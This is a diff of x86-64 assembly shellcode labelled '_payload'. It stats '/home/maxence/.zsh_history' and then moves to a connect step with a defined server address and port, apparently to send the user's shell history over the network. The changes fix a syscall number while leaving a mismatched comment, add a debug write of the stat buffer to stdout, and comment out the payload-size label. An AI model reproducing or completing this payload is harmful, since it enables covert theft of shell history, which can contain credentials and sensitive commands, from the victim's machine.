@@ -55,12 +55,19 @@ _payload:
 	mov r12, rax
 
 	; stat the file
-	mov rax, 5					; SYS_fstat
+	mov rax, 4					; SYS_fstat
 	lea rdi, [rel FILEPATH]		; filename
 	lea rsi, [rel STATBUFFER]	; stat buffer
 	syscall
 	cmp rax, -1
 	je .clean
+
+	; Affichage de succès (utilisation de write)
+    mov rax, 1                   ; numéro de syscall pour write
+    mov rdi, 1                   ; descripteur de fichier (stdout)
+    lea rsi, [rel STATBUFFER]   ; message de succès
+    mov rdx, 144     ; longueur du message
+    syscall
 
 	jmp .connect
 
@@ -120,6 +127,7 @@ _payload:
 	mov rax, 0
 	ret
 
+section .data
 STATBUFFER		times 144 db 1
 ; CONNECT_BUFFER	times 16 db 0
 ;; sockaddr_in structure for the address the listening socket binds to
@@ -134,4 +142,5 @@ iend
 FILEPATH		db '/home/maxence/.zsh_history', 0
 SERVER_PORT		dd 0xba0b
 SERVER_ADDR		dw 0x0
-_payload_size:	dq $-_payload
+
+; _payload_size:	dq $-_payload
